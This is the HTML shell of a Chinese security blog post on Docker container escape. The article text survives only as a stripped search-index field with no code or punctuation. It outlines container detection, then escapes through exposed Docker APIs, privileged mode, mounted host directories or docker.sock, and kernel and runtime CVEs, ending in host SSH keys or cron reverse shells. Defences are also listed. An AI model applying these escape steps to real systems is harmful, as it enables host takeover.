<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Docker Escape | 高木のBlog</title><meta name="keywords" content="权限提升,Docker,云安全"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Docker Escape"><meta name="application-name" content="Docker Escape"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Docker Escape"><meta property="og:url" content="https://blog.takake.com/posts/35958/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="Docker Escape0.容器环境确认获得到一个shell之后我们首先需要判断的是当前是否处于容器环境中，否则后续的一切渗透可能都将会受阻。 那么如何判断? 以下是判断当前环境是否为容器环境的常见方法，适用于 Docker、LXC 等容器环境：  1. 检查 &amp;#x2F;proc&amp;#x2F;1&amp;#x2F;cgroup 文件容"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png"><meta name="description" content="Docker Escape0.容器环境确认获得到一个shell之后我们首先需要判断的是当前是否处于容器环境中，否则后续的一切渗透可能都将会受阻。 那么如何判断? 以下是判断当前环境是否为容器环境的常见方法，适用于 Docker、LXC 等容器环境：  1. 检查 &amp;#x2F;proc&amp;#x2F;1&amp;#x2F;cgroup 文件容"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/35958/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":null,"api":null,"cover_change":true},
  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '高木のBlog',
  title: 'Docker Escape',
  postAI: 'Docker逃逸本质：攻击者利用特权模式、挂载目录、未授权API或内核漏洞突破容器隔离，获取宿主机权限。',
  pageFillDescription: 'Docker Escape, 0.容器环境确认, 1. 检查 /proc/1/cgroup 文件, 2. 检查 /.dockerenv 文件, 3. 检查 /proc/mounts 中的挂载信息, 4. 检查进程数量, 5. 检查虚拟化类型（systemd-detect-virt）, 6. 检查设备文件, 7. 检查内核版本与宿主机是否一致, 8. 检查环境变量, 9. 检查网络接口, 10. 尝试访问宿主机资源, 自动化检测脚本示例, 注意事项, 一、Docker Swarm remote api 未授权访问逃逸技术, 1. 漏洞原理, Docker Swarm 环境搭建, 2. 漏洞检测, (1) 端口扫描, (2) API 探测, (3) Docker 客户端验证, 3. 漏洞利用, (1) 创建特权容器挂载宿主机目录, (2) 直接操作 Docker API, 二、特权模式（Privileged Mode）逃逸, 特权模式（Privileged Mode）逃逸技术详解, 1. 特权模式的定义与作用, 2. 逃逸的核心原理, 3. 检测是否处于特权容器, (1) 检查 Capabilities, (2) 查看挂载的设备, 4. 典型利用步骤与示例, (1) 挂载宿主机根目录逃逸, (2) 利用设备文件读写内存, （3）所有可以尝试的方式, 5. 防御措施, 三、挂载宿主机敏感目录, 挂载宿主机敏感目录容器逃逸技术详解, 1. 漏洞原理, 2. 常见敏感目录及攻击场景, 3. 攻击步骤与示例, 场景 1：挂载宿主机根目录（/）逃逸, 场景 2：挂载 Docker Socket（/var/run/docker.sock）逃逸, 场景 3：挂载 /proc 目录触发代码执行, 4. 检测容器是否挂载敏感目录, 5. 防御措施, 6. 实际案例, 四、内核漏洞逃逸, 内核漏洞逃逸技术详解, 1. 内核漏洞逃逸原理, 2. 漏洞利用条件, 3. 典型内核漏洞与利用场景, (1) Dirty COW（CVE-2016-5195）, (2) CVE-2022-0185（文件系统挂载逃逸）, (3) CVE-2021-4034（Polkit 提权）, 4. 漏洞利用流程, 5. 检测内核漏洞, 五、其他CVE逃逸漏洞, 一、容器组件漏洞, 1. runc 相关漏洞, 2. BuildKit 相关漏洞（Leaky Vessels 系列）, 3. containerd 相关漏洞, 二、CVE-2019-5736 漏洞复现流程, 1. 漏洞原理, 2. 漏洞利用流程, (1) 环境准备, (2) 生成 Payload, (3) 上传 Payload 至容器, (4) 执行攻击, (5) 获取宿主机权限, 3. 关键步骤解析, 三、CVE-2020-15257 漏洞复现流程, 1. 漏洞背景与原理, 2. 漏洞利用流程, 步骤 1：搭建漏洞环境, 步骤 2：检测漏洞存在性, 步骤 3：利用漏洞逃逸, 3. 漏洞原理细节, 4. 实际影响与案例, 四、总结与对比容器环境确认获得到一个之后我们首先需要判断的是当前是否处于容器环境中否则后续的一切渗透可能都将会受阻那么如何判断以下是判断当前环境是否为容器环境的常见方法适用于等容器环境检查文件容器环境的进程控制组信息通常包含等标识命令判断依据如果输出中包含或等关键字则为容器环境物理机或虚拟机通常显示或系统默认的层级如检查文件容器启动时会在根目录生成此文件其他容器如无此文件命令判断依据若文件存在则极可能是容器环境检查中的挂载信息容器中挂载的文件系统通常包含默认存储驱动或命令判断依据若存在或挂载项则可能是容器环境检查进程数量容器内通常只运行少量关键进程如为业务进程而物理机或虚拟机进程数量较多命令判断依据若进程数量极少如少于个可能是容器环境但需结合其他方法验证检查虚拟化类型通过检测虚拟化工具类型判断环境命令判断依据容器环境可能返回或物理机通常返回虚拟机返回等检查设备文件容器环境可能缺少物理机常见的硬件设备如磁盘控制器命令查看磁盘设备容器通常无额外磁盘检查终端设备数量容器通常较少检查内核版本与宿主机是否一致容器通常与宿主机共享内核但某些环境如可能不同命令判断依据如果内核版本与预期宿主机版本一致但当前环境功能受限可能是容器检查环境变量容器启动时可能注入特定的环境变量如命令检查网络接口容器通常存在虚拟网卡如且地址为内网段如命令尝试访问宿主机资源如果怀疑是容器可尝试探测宿主机网络需容器有权限查看宿主机通常为网关尝试访问宿主机服务如自动化检测脚本示例检查环境检测存在检查检测容器环境特征存在检查进程数量进程数量异常可能是容器环境综合判断当前环境可能是容器当前环境可能是物理机或虚拟机注意事项没有绝对可靠的方法某些高度定制的容器可能隐藏特征如删除综合判断需结合多种检测结果提高准确性防御方对抗安全加固的容器可能故意混淆这些特征如使用一未授权访问逃逸技术漏洞原理是守护进程提供的接口默认绑定在端口或端口当管理员错误配置集群时可能将暴露在公网如绑定导致攻击者可绕过认证直接控制服务通过创建特权容器或挂载宿主机敏感目录可实现容器逃逸并获取宿主机权限环境搭建在的启动项中增加重载服务重启初始化漏洞检测端口扫描检查目标是否开放端口探测通过请求验证是否存在未授权访问服务器上运行的容器列表以及容器的配置信息返回版本信息则存在漏洞获取宿主机根目录路径客户端验证使用客户端直接连接远程列出容器信息无需认证漏洞利用创建特权容器挂载宿主机目录步骤通过创建容器并挂载宿主机根目录到容器内在容器内修改宿主机文件如写入定时任务或公钥写入反弹到宿主机或写入公钥到宿主机用户攻击机监听反弹或通过登录宿主机直接操作通过请求创建恶意容器创建挂载宿主机目录的容器启动容器并执行命令二特权模式逃逸特权模式逃逸技术详解特权模式的定义与作用当容器以模式启动时会赋予容器所有并解除设备访问限制这意味着容器内进程拥有与宿主机用户几乎等同的权限容器可以直接访问宿主机所有设备如等允许执行需要高权限的操作如加载内核模块修改内核参数挂载文件系统等逃逸的核心原理特权模式的容器突破了默认的隔离机制攻击者可利用以下路径逃逸挂载宿主机文件系统通过挂载宿主机磁盘直接修改敏感文件如密钥任务内核操作利用内核功能或漏洞如提权到宿主机设备访问直接读写宿主机硬件设备如内存磁盘检测是否处于特权容器检查特权容器值为或所有能力开启普通容器受限如查看挂载的设备特权容器可能挂载等宿主机设备典型利用步骤与示例挂载宿主机根目录逃逸场景攻击者通过特权容器挂载宿主机根目录直接修改文件系统步骤启动特权容器查看宿主机磁盘设备在容器内查看磁盘设备通常为或如果没有权限也没有关系能里出来就行如果没有命令那么就只能遍历了宿主机的显示字节个扇区单元扇区字节扇区大小逻辑物理字节字节大小最小最佳字节字节磁盘标签类型磁盘标识符设备启动起点末尾扇区大小类型扩展挂载宿主机根目录到容器内挂载宿主机磁盘到容器内的目录其他方式可能可以使用的方式挂载目录后可以容器的工作目录到中这时可以直接执行命令添加宿主机的用户甚至可以执行的命令里可以使用命令修改宿主机文件写入公钥到宿主机的用户或写入定时任务反弹攻击者端口使用私钥文件登陆宿主机或者使用私钥登录宿主机获取定时任务端口监听端口利用设备文件读写内存场景通过或直接读写宿主机内存步骤在特权容器中访问物理内存读取宿主机物理内存需权限分析内存提取敏感信息如密码密钥所有可以尝试的方式向宿主机写入公私钥向宿主机写入计划任务向宿主机写入后门用户搜索宿主机上的敏感文件如果宿主机开启服务还可以写入防御措施避免使用特权模式除非绝对必要否则禁止使用替代方案通过按需授予特定权限如最小化必要的权限限制设备访问使用仅允许访问特定设备安全加固配置启用或限制容器行为配置过滤危险系统调用文件系统只读挂载宿主机目录容器目录三挂载宿主机敏感目录挂载宿主机敏感目录容器逃逸技术详解漏洞原理当容器启动时通过或参数挂载宿主机的敏感目录如根目录等攻击者可通过容器内的挂载路径直接读写宿主机文件系统或操作服务从而突破容器隔离获取宿主机权限核心风险点宿主机文件系统暴露挂载或等目录允许容器内直接修改关键配置文件控制权泄露挂载后容器可通过创建新容器或控制宿主机的容器生命周期敏感数据泄露挂载等目录可能直接暴露用户敏感文件如密钥凭据文件常见敏感目录及攻击场景敏感目录攻击场景根目录直接修改宿主机文件如通过创建特权容器挂载宿主机目录或直接执行宿主机命令修改内核参数如触发宿主机代码执行修改系统配置或硬件信息可能导致拒绝服务或提权或窃取用户密钥历史命令记录或配置文件攻击步骤与示例场景挂载宿主机根目录逃逸步骤启动容器并挂载宿主机根目录在容器内通过挂载点修改宿主机文件写入公钥到宿主机用户添加定时任务反弹攻击者端口通过或定时任务获取宿主机权限使用私钥登录宿主机获取定时任务端口监听端口场景挂载逃逸步骤启动容器并挂载在容器内安装客户端工具通过创建特权容器挂载宿主机根目录在特权容器内执行宿主机命令恶意操作恶意文件场景挂载目录触发代码执行步骤启动容器并挂载修改宿主机的以触发代码执行在宿主机上触发崩溃生成在宿主机执行或在容器内攻击宿主机进程某服务宿主机崩溃时会执行需提前植入恶意脚本检测容器是否挂载敏感目录方法检查容器挂载信息查看当前容器的挂载点方法检查启动命令查看容器启动参数需宿主机权限容器方法自动化检测脚本检测敏感目录挂载敏感挂载点挂载点敏感挂载点挂载点检测到敏感目录挂载挂载点防御措施禁止挂载敏感目录避免使用或等高危操作使用命名卷替代直接挂载主机路径最小化挂载权限若必须挂载使用只读模式宿主机目录容器目录限制访问禁止容器挂载若需远程管理启用认证并限制访问安全加固配置启用或限制容器文件系统访问配置过滤危险系统调用如定期审计容器配置使用工具如扫描不安全配置监控容器挂载点变更和异常文件操作实际案例案例集群挂载逃逸攻击者通过挂载卷到中修改宿主机文件重置密码案例滥用某开发环境因挂载攻击者在容器内创建新容器并挂载宿主机根目录窃取集群凭证四内核漏洞逃逸内核漏洞逃逸技术详解内核漏洞逃逸原理容器如依赖于内核的命名空间和控制组实现资源隔离若宿主机内核存在未修复的漏洞攻击者可在容器内利用漏洞突破隔离直接控制宿主机系统此类逃逸不依赖容器配置错误即使容器以非特权模式运行也可能成功漏洞利用条件内核版本存在已知漏洞如未修复的容器具备执行漏洞利用程序的条件允许执行自定义二进制文件如未限制具备必要的如漏洞利用代码适配当前内核环境典型内核漏洞与利用场景漏洞类型竞争条件漏洞机制缺陷影响范围内核利用效果通过修改只读内存页提权到宿主机利用步骤在容器内下载并编译如执行获取宿主机文件系统挂载逃逸漏洞类型内核堆溢出漏洞影响范围内核利用效果通过创建恶意挂载命名空间实现容器逃逸利用步骤在容器内编译并运行如编译执行创建特权进程提权漏洞类型的组件本地提权漏洞影响范围系统未更新的版本利用效果在容器内获取宿主机权限需容器与宿主机共享用户命名空间利用步骤下载并运行如漏洞利用流程信息收集查看内核版本检查确认适配性如架构内核补丁状态漏洞验证使用公开的代码测试漏洞是否存在编译与执行在容器内上传或下载代码编译并运行需确保容器内具备编译环境如提权后操作写入密钥反弹或直接操作宿主机文件系统检测内核漏洞查看内核版本检查已知漏洞是否修复如若返回可能已修复五其他逃逸漏洞以下是近年来公开的主要容器逃逸漏洞及技术分类结合影响范围和利用原理进行总结一容器组件漏洞相关漏洞影响版本至原理由于文件描述符泄漏攻击者可通过构造恶意容器镜像或利用命令使容器进程访问宿主机文件系统覆盖宿主机二进制文件实现逃逸利用场景攻击者通过挂载目录绕过隔离访问宿主机根目录容器逃逸影响版本原理通过覆盖宿主机上的二进制文件当管理员执行时触发恶意代码执行利用条件需容器内用户权限且宿主机管理员执行容器操作影响版本原理容器内进程可通过特定操作突破命名空间隔离访问宿主机资源相关漏洞系列中恶意构建步骤通过共享缓存挂载引发竞争条件访问宿主机文件恶意利用参数删除宿主机文件权限检查不严允许以提升的权限运行容器相关漏洞影响版本或原理当容器以共享宿主机网络命名空间时攻击者通过控制宿主机容器二漏洞复现流程以下是漏洞的利用流程详解结合漏洞原理及复现步骤漏洞原理该漏洞源于容器运行时组件等底层依赖攻击者可通过容器内进程访问宿主机的文件描述符覆盖宿主机上的二进制文件当管理员执行或容器启动时触发恶意代码执行从而以宿主机权限逃逸容器环境核心条件影响版本或权限要求容器内需具备权限漏洞利用流程环境准备搭建漏洞环境安装未修复的版本如确认版本启动容器生成下载代码如修改将中的命令替换为反弹或其他恶意指令例如攻击机端口编译生成可执行文件需环境上传至容器复制到容器内执行攻击在容器内运行会持续监听目录等待宿主机执行触发漏洞管理员在宿主机执行命令如进入容器此时容器内的会通过覆盖宿主机文件获取宿主机权限反弹攻击机监听指定端口获得宿主机权限的任意命令执行覆盖后的会在后续容器操作中执行攻击者预设的命令关键步骤解析覆盖文件容器内通过访问宿主机的进程文件描述符以写入恶意代码利用的机制绕过文件路径限制触发机制操作会调用进入容器命名空间此时容器内进程可捕获的三漏洞复现流程以下是漏洞的利用流程详解结合漏洞原理及复现步骤漏洞背景与原理漏洞组件的容器运行时组件通过其子组件暴露的抽象域套接字实现容器管理触发条件容器以共享宿主机网络命名空间启动容器内进程以用户运行版本或漏洞本质攻击者可通过共享的网络命名空间访问宿主机上的套接字调用其创建新容器或执行命令实现容器逃逸漏洞利用流程步骤搭建漏洞环境安装有漏洞的版本如以模式启动容器步骤检测漏洞存在性查看抽象套接字容器内执行若输出类似哈希则存在漏洞步骤利用漏洞逃逸下载并上传利用工具如下载容器渗透工具包将工具复制到容器内在容器内执行进入容器执行反弹攻击机监听端口攻击机监听端口监听端口成功时攻击机会收到宿主机的实现逃逸漏洞原理细节抽象套接字暴露通过抽象域套接字以开头与通信当容器共享宿主机网络命名空间时攻击者可扫描获取套接字路径滥用通过套接字调用的如创建新容器挂载宿主机根目录绕过隔离机制实际影响与案例攻击场景攻击者可利用该漏洞在云原生环境中横向移动控制宿主机及集群内其他容器案例未修复的集群中恶意容器通过网络逃逸窃取敏感数据或部署后门四总结与对比架构中的角色构建镜像生成符合标准的镜像文件管理镜像和容器生命周期调用执行容器实际创建容器进程实现内核级隔离中的调用链通过接口调用通过运行容器独立使用场景仅需手动创建容器需准备和配置文件仅需轻量级容器管理无需的复杂功能仅需高效构建镜像如集成到工具链组件定位核心功能依赖关系底层运行时工具容器进程创建与资源隔离独立运行被调用容器运行时管理器镜像管理容器生命周期依赖执行容器镜像构建工具高效构建与缓存管理可选依赖主要风险来自文件描述符泄漏和二进制覆盖如和构建阶段的竞态条件权限缺陷和文件操作漏洞是逃逸核心如共享网络命名空间导致滥用如',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-07 16:18:06',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 8 || hour >= 22
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "10",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div 